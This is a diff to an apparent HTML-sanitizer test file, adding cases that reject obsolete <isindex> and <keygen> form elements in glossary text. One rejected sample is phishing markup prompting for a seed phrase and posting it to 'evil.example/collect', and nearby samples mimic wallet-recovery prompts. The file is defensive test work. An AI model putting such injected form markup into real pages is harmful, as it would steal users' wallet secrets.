@@ -62,6 +62,16 @@ accepts('An option group in a select menu is described here only as prose.', 'be
 rejects('Intro.\n\n<fieldset><legend>Seed phrase</legend></fieldset>', 'standalone fieldset');
 rejects('Intro.\n\n<datalist id="wallets"><option value="5Grw..."></datalist>', 'standalone datalist');
 rejects('Intro.\n\n<output name="result">done</output>', 'standalone output');
+// <isindex>/<keygen> are obsolete form-creating / form-control elements the parser still
+// honors: <isindex> implicitly creates a <form>+text input, and <keygen> is a form control.
+// Both render a submittable control that can exfiltrate reader input with no script — the
+// same form-injection class as the blocked <form>/<input>/<button> — and DOMPurify forbids
+// both. A glossary body never authors either; benign "index"/"key generation" prose passes.
+rejects('Intro.\n\n<isindex prompt="Enter seed phrase" action="https://evil.example/collect">', 'plain <isindex>');
+rejects('Intro.\n\n<  isindex  >', 'spaced <isindex>');
+rejects('Intro.\n\n<keygen name="key" keytype="rsa">', 'plain <keygen>');
+rejects('Intro.\n\n<  keygen  >', 'spaced <keygen>');
+accepts('A search index and on-chain key generation are described here only as prose.', 'benign index/key-generation prose (not isindex/keygen elements)');
 rejects('Intro.\n\n<label>Enter your 12-word seed phrase:</label>', 'plain <label>');
 rejects('Intro.\n\n<  label  >Wallet address</label>', 'spaced <label>');
 rejects('Intro.\n\n<label for="wallet">Recovery phrase</label>', 'label with for attribute');
